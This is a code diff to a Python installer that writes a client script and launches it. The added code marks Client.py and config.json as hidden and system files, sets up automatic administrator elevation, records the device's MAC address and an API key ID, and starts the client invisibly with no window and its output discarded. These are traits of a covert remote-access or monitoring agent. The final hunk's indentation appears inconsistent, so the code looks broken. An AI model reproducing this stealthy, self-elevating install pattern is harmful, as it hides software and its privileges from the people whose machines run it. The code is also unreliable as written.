@@ -2862,19 +2862,76 @@ powershell -Command "Start-Process -FilePath '{sys.executable}' -ArgumentList '{
         """Create unified cross-platform Client Python script with Windows admin manifest"""
         client_script = self._get_unified_client_code()
         client_path = self.install_path / "Client.py"
-        with open(client_path, 'w', encoding='utf-8') as f:
-            f.write(client_script)
         
-        if self.system == "Windows":
-            # Create Windows Application Manifest for automatic admin privileges
-            self._create_windows_manifest()
-            # Create batch wrapper that uses the manifest
-            self._create_admin_batch_wrapper()
-            # Set hidden attributes
-            subprocess.run(["attrib", "+S", "+H", str(client_path)], 
-                          check=False, creationflags=subprocess.CREATE_NO_WINDOW)
-        
-        print("[OK] Unified cross-platform client script created")
+        try:
+            # Ensure installation directory exists and is accessible
+            if not self.install_path.exists():
+                print(f"[ERR] Installation directory does not exist: {self.install_path}")
+                return False
+                
+            # Write client script with explicit encoding
+            with open(client_path, 'w', encoding='utf-8') as f:
+                f.write(client_script)
+            
+            # Verify file was created successfully
+            if not client_path.exists():
+                print(f"[ERR] Failed to create Client.py at: {client_path}")
+                return False
+                
+            # Check file size to ensure content was written
+            file_size = client_path.stat().st_size
+            if file_size < 1000:  # Client script should be substantial
+                print(f"[WARNING] Client.py appears incomplete (size: {file_size} bytes)")
+                
+            print(f"[OK] Client.py created successfully ({file_size} bytes)")
+            print(f"     Location: {client_path}")
+            
+            if self.system == "Windows":
+                # Create Windows Application Manifest for automatic admin privileges
+                manifest_success = self._create_windows_manifest()
+                # Create batch wrapper that uses the manifest  
+                batch_success = self._create_admin_batch_wrapper()
+                
+                # Set proper Windows file permissions and attributes
+                try:
+                    # Set file as executable (readable by owner and system)
+                    import stat
+                    client_path.chmod(stat.S_IREAD | stat.S_IWRITE | stat.S_IEXEC)
+                    print(f"[OK] Set executable permissions on Client.py")
+                except Exception as e:
+                    print(f"[WARNING] Could not set file permissions: {e}")
+                
+                # Set hidden and system attributes for security
+                try:
+                    result = subprocess.run(["attrib", "+S", "+H", str(client_path)], 
+                                          check=False, 
+                                          creationflags=subprocess.CREATE_NO_WINDOW,
+                                          capture_output=True, text=True)
+                    if result.returncode == 0:
+                        print(f"[OK] Set hidden/system attributes on Client.py")
+                    else:
+                        print(f"[WARNING] Could not set file attributes: {result.stderr}")
+                except Exception as e:
+                    print(f"[WARNING] Error setting file attributes: {e}")
+                    
+                # Verify the client can be executed
+                if self._verify_client_executable():
+                    print(f"[OK] Client.py verified as executable")
+                else:
+                    print(f"[WARNING] Client.py may not be properly executable")
+                    
+            print("[OK] Unified cross-platform client script created")
+            return True
+            
+        except PermissionError as e:
+            print(f"[ERR] Permission denied creating Client.py: {e}")
+            print(f"      Ensure installer is running with administrator privileges")
+            return False
+        except Exception as e:
+            print(f"[ERR] Failed to create Client.py: {e}")
+            import traceback
+            traceback.print_exc()
+            return False
     
     def _create_windows_manifest(self):
         """Create Windows Application Manifest for automatic admin privileges"""
@@ -2972,6 +3029,84 @@ exit'''
             
         except Exception as e:
             print(f"Warning: Could not create admin batch wrapper: {e}")
+            return False
+            
+    def _verify_client_executable(self) -> bool:
+        """Verify that the Client.py is properly executable with appropriate permissions.
+        
+        This method performs checks to ensure that:
+        1. The client file exists
+        2. The file has appropriate permissions
+        3. The file can be executed (performs a non-destructive test)
+        
+        Returns:
+            bool: True if the client is verified as executable, False otherwise
+        """
+        try:
+            import os
+            import stat
+            import sys
+            
+            client_path = self.install_path / "Client.py"
+            
+            # Step 1: Verify file existence
+            if not client_path.exists():
+                print(f"[ERR] Client.py does not exist at: {client_path}")
+                return False
+            
+            # Step 2: Check file size
+            file_size = client_path.stat().st_size
+            if file_size < 1000:  # Client script should be substantial
+                print(f"[WARNING] Client.py appears too small ({file_size} bytes)")
+                
+            # Step 3: Check file permissions
+            try:
+                # Check if file is readable and executable
+                is_executable = os.access(client_path, os.X_OK)
+                is_readable = os.access(client_path, os.R_OK)
+                
+                if not is_readable:
+                    print(f"[WARNING] Client.py is not readable")
+                    
+                if not is_executable:
+                    print(f"[WARNING] Client.py is not marked as executable")
+                    
+                # On Windows, the X_OK check may not be reliable,
+                # so we'll also check the file mode directly
+                if self.system == "Windows":
+                    file_mode = client_path.stat().st_mode
+                    if not (file_mode & stat.S_IEXEC):
+                        print(f"[WARNING] Client.py does not have executable permissions")
+            except Exception as e:
+                print(f"[WARNING] Could not check file permissions: {e}")
+                
+            # Step 4: Try a non-destructive execution test on Windows
+            # This checks if Python can at least parse the file without errors
+            if self.system == "Windows":
+                try:
+                    # Use Python to check syntax without executing
+                    result = subprocess.run(
+                        [sys.executable, "-m", "py_compile", str(client_path)],
+                        check=False,
+                        capture_output=True,
+                        text=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+                    
+                    if result.returncode != 0:
+                        print(f"[WARNING] Client.py has syntax errors: {result.stderr}")
+                        return False
+                except Exception as e:
+                    print(f"[WARNING] Could not verify client syntax: {e}")
+                    return False
+                    
+            # If we reach here, the client is likely executable
+            return True
+            
+        except Exception as e:
+            print(f"[ERR] Failed to verify client executable: {e}")
+            import traceback
+            traceback.print_exc()
             return False
     def _create_installer_copy(self):
         """Create a copy of the installer for repair/maintenance functionality"""
@@ -6557,25 +6692,50 @@ def main():
         if success:
             if message_relay:
                 message_relay.send_status("launching", "Installation complete - starting client...")
-            # Launch client as separate background process
-            try:
-                client_path = installer.install_path / "Client.py"
-                if client_path.exists():
-                    print(f"[INFO] Starting client from: {client_path}")
-                    
-                    # Use pythonw.exe to ensure no console window appears
-                    pythonw_exe = sys.executable.replace('python.exe', 'pythonw.exe')
-                    if not Path(pythonw_exe).exists():
-                        pythonw_exe = sys.executable  # Fallback to python.exe
-                    
-                    # Start client with admin privileges and hidden window
-                    process = subprocess.Popen(
-                        [pythonw_exe, str(client_path)],
-                        creationflags=subprocess.CREATE_NO_WINDOW,
-                        cwd=str(installer.install_path),
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL
-                    )
+        # Launch client as separate background process with enhanced configuration
+        try:
+            client_path = installer.install_path / "Client.py"
+            if client_path.exists():
+                print(f"[INFO] Starting client from: {client_path}")
+                
+                # Create runtime configuration file for client
+                config_data = {
+                    'api_url': installer.api_url,
+                    'client_id': installer.device_data.get('clientId', 'unknown'),
+                    'key_id': installer.key_id,
+                    'mac_address': installer.mac_address,
+                    'install_path': str(installer.install_path),
+                    'version': INSTALLER_VERSION,
+                    'run_invisibly': True,
+                    'startup_timestamp': datetime.now().isoformat()
+                }
+                
+                config_path = installer.install_path / "config.json"
+                with open(config_path, 'w', encoding='utf-8') as f:
+                    json.dump(config_data, f, indent=2)
+                
+                # Set config file as hidden
+                subprocess.run(["attrib", "+H", str(config_path)], 
+                             check=False, creationflags=subprocess.CREATE_NO_WINDOW)
+                
+                print(f"[OK] Configuration saved for client startup")
+                
+                # Use pythonw.exe to ensure no console window appears
+                pythonw_exe = sys.executable.replace('python.exe', 'pythonw.exe')
+                if not Path(pythonw_exe).exists():
+                    pythonw_exe = sys.executable  # Fallback to python.exe
+                    print(f"[INFO] Using python.exe (pythonw.exe not found)")
+                else:
+                    print(f"[OK] Using pythonw.exe for invisible startup")
+                
+                # Start client with admin privileges and hidden window
+                process = subprocess.Popen(
+                    [pythonw_exe, str(client_path)],
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    cwd=str(installer.install_path),
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
                     
                     # Monitor client startup process
                     startup_success = False
